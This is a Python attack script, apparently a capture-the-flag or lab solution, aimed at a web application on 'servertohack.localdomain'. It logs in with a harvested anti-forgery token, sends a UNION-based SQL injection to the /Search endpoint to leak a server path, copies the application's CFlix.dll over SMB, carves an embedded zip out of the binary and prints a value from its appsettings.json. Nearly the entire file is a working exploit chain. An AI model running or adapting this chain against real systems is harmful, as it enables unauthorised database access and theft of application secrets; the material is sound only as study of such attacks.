#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import configparser
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib
import codecs
import pefile
from io import BytesIO
import zipfile
import smbc
import os


#
# Variables
#

debugOrNot = False
target_hostname = 'servertohack.localdomain'
target_proto = 'https'
config = configparser.ConfigParser()
config.read('config.ini')
username = config['credentials']['username']
password = config['credentials']['password']
domain = config['credentials']['domain']
base_url = target_proto + '://' + target_hostname


#
# Debug
#

def myDebug(param):
  if debugOrNot == True:
    print(param)


#
# requestDebug
#

def requestDebug(s, req):
  prepared = req.prepare()
  myDebug('-----------REQUEST-----------')
  myDebug(prepared.method + ' ' + prepared.url)
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in prepared.headers.items()))
  if prepared.body != None:
    myDebug('\n' + prepared.body)
  r = s.send(prepared)
  r.encoding = 'UTF-8'
  myDebug('\n-----------RESPONSE-----------')
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in r.headers.items()) + '\n')
  return r


#
# SMB authentication
#

def do_auth (smbserver, smbshare, smbworkgroup, smbusername, smbpassword):
  return (domain, username, password)


#
# Main
#

s = requests.Session()
s.verify = False

headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
  'Accept-Encoding': 'none'
}


#
# Get __RequestVerificationToken hidden parameter from FORM
#

req = requests.Request('GET', base_url, headers=headers)
r = requestDebug(s, req)
cookies = requests.utils.dict_from_cookiejar(s.cookies)
token = BeautifulSoup(r.text, 'lxml').find('input', { 'name': '__RequestVerificationToken' }).get('value')
myDebug(token)


#
# Login
#

headers['Content-Type'] = 'application/x-www-form-urlencoded'
payload = 'Login=' + urllib.parse.quote_plus(username) + '&Password=' + urllib.parse.quote_plus(password) + '&__RequestVerificationToken=' + token
req = requests.Request('POST', base_url + '/Login?returnurl=%2F', headers=headers, data=payload, cookies=cookies)
r = requestDebug(s, req)
cookies = requests.utils.dict_from_cookiejar(s.cookies)
del headers['Content-Type']


#
# SQL Injection : "1' and 1=0 union select 1,2,Content,4,null,null from Reviews where id=11 -- -"
#

req = requests.Request('GET', base_url + '/Search?query=1%27+and+1%3D0+union+select+1%2C2%2CContent%2C4%2Cnull%2Cnull+from+Reviews+where+id%3D11+--+-', headers=headers, cookies=cookies)
r = requestDebug(s, req)
img = BeautifulSoup(r.text, 'lxml').find('img', { 'src': '2' }).get('alt')
path = img.split('\n')[3].split()[3]
srcfile = 'smb://my.nas/share/' + '/'.join(path.split('\\')[1:-2]) + '/bin/Debug/netcoreapp1.1/CFlix.dll'
myDebug(srcfile)


#
# Get file from SMB
#

ctx = smbc.Context(auth_fn=do_auth)
source = ctx.open(srcfile, os.O_RDONLY)
destfile = 'CFlix.dll'
f = open(destfile, 'wb')
f.write(source.read())
f.close()
source.close()


#
# Extract zip file CFlix.dll.zip from resources in CFlix.dll
#

pe =  pefile.PE('CFlix.dll')

#for section in pe.sections:
#  print(section.Name)
#b'.text\x00\x00\x00'
#b'.rsrc\x00\x00\x00'
#b'.reloc\x00\x00'

#rsrcnb = 1
#for rsrc in pe.DIRECTORY_ENTRY_RESOURCE.entries:
#  for entry in rsrc.directory.entries:
#    offset = entry.directory.entries[0].data.struct.OffsetToData
#    size = entry.directory.entries[0].data.struct.Size
#    f = open('principal_5_' + str(rsrcnb) + '.zip', 'wb')
#    f.write(pe.get_memory_mapped_image()[offset:offset+size])
#    f.close()
#    rsrcnb = rsrcnb + 1

cflix_settings_zip = BytesIO(pe.sections[0].get_data()[0x9a10:0x9a10+302])
fd_zip = zipfile.ZipFile(cflix_settings_zip, 'r')
appsettings_json = fd_zip.read('appsettings.json')
fd_zip.close()
cflix_settings_zip.close()
print(appsettings_json.split()[21].decode().split('"')[0])


#
# Logout
#

req = requests.Request('GET', base_url + '/Account/Logout', headers=headers, cookies=cookies)
r = requestDebug(s, req)
